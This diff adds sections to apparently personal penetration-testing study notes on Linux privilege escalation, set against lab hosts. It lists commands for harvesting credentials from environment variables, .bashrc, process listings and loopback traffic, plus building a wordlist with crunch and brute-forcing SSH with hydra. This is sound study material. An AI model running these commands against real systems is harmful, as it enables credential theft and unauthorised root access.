@@ -227,3 +227,93 @@ $ find / -perm -u=s -type f 2>/dev/null
 An example of a good SUID binary exploitation is if /bin/cp (the copy command) were SUID, we can copy and overwrite sensitive files like /etc/password. 
 
 ## Automated Enumeration
+
+unix-privesc-check comes pre-installed on Kali at /usr/bin/unix-privesc-check.
+
+```console
+// get file on victim machine
+$ scp /bin/unix-privesc-check joe@192.168.242.214:/home/joe/
+
+// for help menu
+$ unix-privesc-check
+
+// to run
+$ ./unix-privesc-check standard > output.txt
+```
+
+Additional Linux privilege escalation tools include [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
+
+## Exposed Confidential Information
+
+### Inspecing User Trails
+
+We have access to user history that can potentially contain cleartext passwords or auth information. Linux systems usually store user-specific config files in the user's home dir. There are called dotfiles, as they are prepended with a period and are not listed when using basic list commands. The .bashrc script is an example - new terminal windows are open from an existing login session or a new shell is started from an existing login session and the .bashrc script holds environment variables that are auto-set when this happens. Sometimes there are creds in env vars.
+
+```console
+// list all env variables
+$ env
+
+// inspect .bashrc to confirm if the env var you found is a permanent var
+$ cat .bashrc
+
+// if you found a password, try to escalate
+$ su - root
+$ whoami
+```
+
+Try building a custom dictionary from the known password to attempt brute force on a second account.
+
+```console
+// make dictonary - this is min length 6, max length 6, pattern of three numeric digits after the hardcoded password
+$ crunch 6 6 -t Lab%%% > wordlist
+```
+
+If your mchine has an SSH server, try a remote brute force with Hydra.
+
+```console
+$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
+
+$ ssh eve@192.168.50.214
+
+eve$
+// list sudo capabilities
+eve$ sudo -l
+User eve may run the following commands on debian-privesc:
+    (ALL : ALL) ALL
+
+// escalate to root
+$ sudo -i
+```
+
+### Inspecting Service Footprints
+
+System daemons are Linux services spawned at boot that perform specific operations without user interaction. Servers like SSH, web servers, and databases especially host many daemons. Sysadmins often rely on custom daemons to do ad-hoc tasks. We should inspect running process anomalies. 
+
+On Linux, we can list info about higher-privilegeprocesses, unlike Windows.
+
+```console
+// in this command, ps runs every second with the watch utility and we grep the results for "pass".
+$ watch -n 1 "ps -aux | grep pass"
+
+joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
+root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
+root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
+```
+
+This daemon is connecting to the local system via eve with cleartext creds. The daemon is also root and we can still inspect its activity.
+
+We should also verify if we have rights to capture network traffic. NOTE: tcpdump needs sudo perms.
+
+```console
+// captures traffic on the loopback interface, dumps in ASCII, looks for "pass"
+$ sudo tcpdump -i lo -A | grep "pass"
+
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+...{...zuser:root,pass:lab -
+...5...5user:root,pass:lab -
+```
+
+## Insecure File Permissions
+
+### Abusing Cron Jobs
